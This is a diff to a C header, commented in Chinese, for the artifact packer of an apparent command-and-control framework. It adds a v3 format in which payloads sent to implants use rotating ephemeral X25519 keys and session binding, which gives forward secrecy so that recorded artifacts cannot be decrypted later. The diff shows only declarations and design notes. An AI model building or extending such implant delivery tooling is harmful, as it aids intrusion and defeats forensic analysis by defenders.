@@ -48,9 +48,15 @@ extern "C" {
 #define PK_HDR_LEN     108   /* v1: 8+4+4+8+8+16+12+16+32 */
 #define PK_BIND_ID_LEN 32
 #define PK_HDR_V2_LEN  140   /* v2: v1 头 + bind_id(32) */
-#define PK_VERSION     1
+#define PK_HDR_V3_LEN  176   /* v3: v2 头 + epoch(4) + eph_pub(32) */
+#define PK_VERSION     1     /* 已废弃：pk_unpack 拒绝解 v1，仅内部压测用 */
 #define PK_VERSION2    2     /* 会话绑定制品：bind_id 纳入 AAD */
+#define PK_VERSION3    3     /* 纪元 + ephemeral X25519：制品具备前向保密 */
 #define PK_FLAG_COMPRESSED 0x1u
+
+/* v3 制品头附加字段长度 */
+#define PK_EPOCH_LEN    4    /* 制品纪元字段（u32 小端，明文，纳入 AAD） */
+#define PK_EPH_PUB_LEN  32   /* X25519 临时公钥（明文，纳入 AAD） */
 
 /* 会话绑定派生所需的密钥材料长度（对齐 02_c2 的 C2_KEY_LEN） */
 #define PK_SESSION_KEY_LEN 16
@@ -76,6 +82,9 @@ extern "C" {
 #define PK_ERR_SYS      -10  /* 系统调用失败 */
 #define PK_ERR_BIND     -11  /* 绑定标识不符（制品属于另一会话/植入体） */
 #define PK_ERR_DEGEN    -12  /* 密钥退化：k_c2s == k_s2c，拒绝派生 */
+#define PK_ERR_EXPIRED  -13  /* 制品纪元已滚出植入体保留窗口（前向保密生效） */
+#define PK_ERR_IMPLID   -14  /* implant_id 非法（空/超长/不可打印/含分隔符） */
+#define PK_ERR_CANON    -15  /* 绑定上下文非规范编码（防多编码同义） */
 
 typedef struct {
     uint32_t version;
@@ -87,6 +96,8 @@ typedef struct {
     uint8_t  tag[PK_TAG_LEN];
     uint8_t  raw_sha[PK_SHA_LEN];
     uint8_t  bind_id[PK_BIND_ID_LEN];  /* v2 起有效；v1 全零 */
+    uint32_t epoch;                    /* v3 起有效；v1/v2 为 0 */
+    uint8_t  eph_pub[PK_EPH_PUB_LEN];  /* v3 起有效：打包方临时 X25519 公钥 */
 } pk_hdr;
 
 const char *pk_errstr(int e);
@@ -214,6 +225,185 @@ int pk_artifact_bind_id(const uint8_t *blob, size_t blob_len,
 
 /* v2 制品尺寸上界（供分配缓冲）。 */
 size_t pk_size_bound_v2(size_t raw_len);
+
+/* v3 制品尺寸上界（供分配缓冲）。 */
+size_t pk_size_bound_v3(size_t raw_len);
+
+/* ====================================================================
+ * 规范化绑定上下文（消除"调用方随意序列化"导致的绑定退化）
+ * ====================================================================
+ *
+ * v2 接受任意 bind_ctx 字节串，两个不同会话若碰巧拼出相同字节，绑定即失效。
+ * v3 改为只接受结构化 pk_binding_t，并由本模块做规范编码（canonical）：
+ *
+ *   编码 = 域标签 || u32(version) || 16B(server_static_id)
+ *          || u16(nid) || implant_id 字节 || u64(generation) || u32(epoch)
+ *
+ * 单射性由三点保证：
+ *   1. 固定字段顺序 + 固定宽度（id 16B、generation u64、epoch u32）
+ *   2. implant_id 以 u16 长度前缀引导，不做 NUL 分隔 —— 无法用内容伪造边界
+ *   3. implant_id 字符集受限（可打印 ASCII，禁 '/'、'\\'、'.'、NUL）
+ *
+ * 解码端额外做 canonical 校验：缓冲区剩余字节必须全零，
+ * 因此"同一结构体两种编码"会被判为 PK_ERR_CANON 而非静默接受。
+ */
+
+#define PK_BINDING_VERSION  1u
+#define PK_SERVER_ID_LEN    16
+#define PK_IMPLANT_ID_MAX   63   /* 不含 NUL；上限由 u16 长度前缀决定 */
+
+typedef struct {
+    uint32_t version;                    /* 必须为 PK_BINDING_VERSION */
+    uint8_t  server_static_id[PK_SERVER_ID_LEN];
+    char     implant_id[PK_IMPLANT_ID_MAX + 1u];
+    uint64_t generation;                 /* C2 侧会话代数（密钥轮换用） */
+    uint32_t epoch;                      /* 制品纪元（与植入体密钥轮换联动） */
+} pk_binding_t;
+
+/*
+ * 校验并规范编码。out 可为 NULL（仅探测长度）。
+ * 成功返回编码长度；缓冲不足返回 PK_ERR_NOMEM。
+ * implant_id 非法返回 PK_ERR_IMPLID；version 不为 1 返回 PK_ERR_VERSION。
+ */
+int pk_binding_encode(const pk_binding_t *b, uint8_t *out, size_t cap,
+                      size_t *out_len);
+
+/*
+ * 解码。做 canonical 校验（尾部必须全零、nid 与字符串长度一致、
+ * implant_id 字符集合法）。非规范编码返回 PK_ERR_CANON。
+ */
+int pk_binding_decode(const uint8_t *in, size_t in_len, pk_binding_t *out);
+
+/*
+ * 由 02_c2 的会话参数构造绑定结构体（等价于 c2_build_context 的输入面，
+ * 但这里产出结构化对象而非不透明字节，供打包器内部使用）。
+ * epoch 由调用方显式给出（制品纪元）。
+ */
+int pk_binding_make(const uint8_t server_static_id[PK_SERVER_ID_LEN],
+                    const char *implant_id,
+                    uint64_t generation,
+                    uint32_t epoch,
+                    pk_binding_t *out);
+
+/* ====================================================================
+ * 植入体静态密钥轮换（制品层前向保密）
+ * ====================================================================
+ *
+ * v2 的种子直接由会话密钥派生：会话密钥一旦泄露，历史录制的制品可离线解开。
+ * v3 引入 X25519 ephemeral-static + 静态密钥按纪元轮换：
+ *
+ *   打包方（C2）：为每件制品生成临时密钥对 (e, E)
+ *                 ss = X25519(e, pk_implant@epoch)
+ *                 E 写进制品头（纳入 AAD）；e 用完立即安全擦除
+ *   植入体：      ss = X25519(sk_implant@epoch, E)
+ *
+ * 前向保密来源：植入体每个 epoch 重新生成静态密钥对，滚出保留窗口的
+ * 私钥被 secure_zero 擦除。此后即便拿到会话密钥 + 完整录制制品
+ * （制品里只有 E，没有 sk），也无法重算 ss —— 历史制品永久解不开。
+ *
+ * 保留窗口 PK_RETAIN = 2（当前 + 上一个）：容忍在途制品。
+ * 改 1 = PFS 立即生效但可能解不开刚下发的制品；改大则 PFS 生效更慢。
+ */
+
+#define PK_RETAIN        2
+#define PK_IMPLANT_SK_LEN 32
+#define PK_IMPLANT_PK_LEN 32
+
+typedef struct {
+    uint32_t epoch;
+    uint8_t  sk[PK_IMPLANT_SK_LEN];
+    uint8_t  pk[PK_IMPLANT_PK_LEN];
+} pk_keyslot_t;
+
+typedef struct {
+    pk_keyslot_t slots[PK_RETAIN];   /* slots[0] 为最新 */
+    int          n;
+    uint32_t     next_epoch;
+} pk_implant_key_t;
+
+/* 初始生成 epoch 0 密钥对。 */
+int  pk_implant_key_init(pk_implant_key_t *k);
+
+/* 安全擦除全部槽位（含所有私钥）。 */
+void pk_implant_key_wipe(pk_implant_key_t *k);
+
+/*
+ * 轮换到下一纪元：新密钥对入槽，滚出窗口的旧私钥安全擦除。
+ * new_epoch 可为 NULL。
+ */
+int  pk_implant_key_rotate(pk_implant_key_t *k, uint32_t *new_epoch);
+
+/* 取当前纪元的静态公钥（打包方用它算 ss）。 */
+int  pk_implant_key_pub(const pk_implant_key_t *k,
+                        uint8_t out[PK_IMPLANT_PK_LEN]);
+
+/* 是否仍持有某纪元的私钥。 */
+int  pk_implant_key_has_epoch(const pk_implant_key_t *k, uint32_t epoch);
+
+/* 主动丢弃某纪元私钥（立即让该纪元制品失效）。 */
+int  pk_implant_key_forget(pk_implant_key_t *k, uint32_t epoch);
+
+/* ====================================================================
+ * v3 制品：ephemeral-static 派生 + 纪元联动
+ * ====================================================================
+ *
+ *   ikm  = ss(32) || k_c2s(16) || k_s2c(16)
+ *   seed = HKDF-Extract(salt = binding_encode(b), ikm)
+ *          -> Expand(info = "dayanjing:packer:artifact:v3", 32 字节)
+ *
+ * ss 提供单向性与前向保密；会话密钥提供"只有该会话能解"的绑定。
+ * 任一缺失都不够：只有 ss 则任何拿到植入体公钥者都能造制品；
+ * 只有会话密钥则无 PFS。
+ */
+
+/*
+ * 打包方派生种子（需要植入体静态公钥，不需要其私钥）。
+ * eph_priv 若为 NULL 则内部生成并在返回前擦除；
+ * 非 NULL 时调用方须自行擦除（测试用）。
+ */
+int pk_artifact_seed(const pk_binding_t *b,
+                     const uint8_t k_c2s[PK_SESSION_KEY_LEN],
+                     const uint8_t k_s2c[PK_SESSION_KEY_LEN],
+                     const uint8_t pk_implant[PK_IMPLANT_PK_LEN],
+                     uint8_t eph_pub_out[PK_EPH_PUB_LEN],
+                     uint8_t seed[PK_SHA_LEN]);
+
+/*
+ * 解包方派生种子（需要植入体静态私钥，由纪元定位）。
+ * epoch 不存在于保留窗口时返回 PK_ERR_EXPIRED。
+ */
+int pk_artifact_seed_open(const pk_implant_key_t *k,
+                          const pk_binding_t *b,
+                          const uint8_t k_c2s[PK_SESSION_KEY_LEN],
+                          const uint8_t k_s2c[PK_SESSION_KEY_LEN],
+                          const uint8_t eph_pub[PK_EPH_PUB_LEN],
+                          uint8_t seed[PK_SHA_LEN]);
+
+/*
+ * 打包为 v3 制品。调用方提供植入体当前静态公钥。
+ * 返回的制品头内含 epoch 与临时公钥，二者均纳入 AAD。
+ */
+int pk_pack_artifact(const uint8_t *raw, size_t raw_len,
+                     const pk_binding_t *b,
+                     const uint8_t k_c2s[PK_SESSION_KEY_LEN],
+                     const uint8_t k_s2c[PK_SESSION_KEY_LEN],
+                     const uint8_t pk_implant[PK_IMPLANT_PK_LEN],
+                     uint8_t *out, size_t *out_len);
+
+/*
+ * 解包 v3 制品。纪元从制品头读取并由植入体密钥窗口校验：
+ *   - 纪元不在窗口内        -> PK_ERR_EXPIRED（前向保密已生效）
+ *   - 纪元在但密钥/绑定不符 -> PK_ERR_AUTH / PK_ERR_BIND
+ */
+int pk_unpack_artifact(const uint8_t *blob, size_t blob_len,
+                       const pk_implant_key_t *k,
+                       const pk_binding_t *b,
+                       const uint8_t k_c2s[PK_SESSION_KEY_LEN],
+                       const uint8_t k_s2c[PK_SESSION_KEY_LEN],
+                       uint8_t *out, size_t *out_len);
+
+/* 取制品头中的纪元（v1/v2 返回 0 并正常返回 PK_OK）。 */
+int pk_artifact_epoch(const uint8_t *blob, size_t blob_len, uint32_t *epoch);
 
 #ifdef __cplusplus
 }
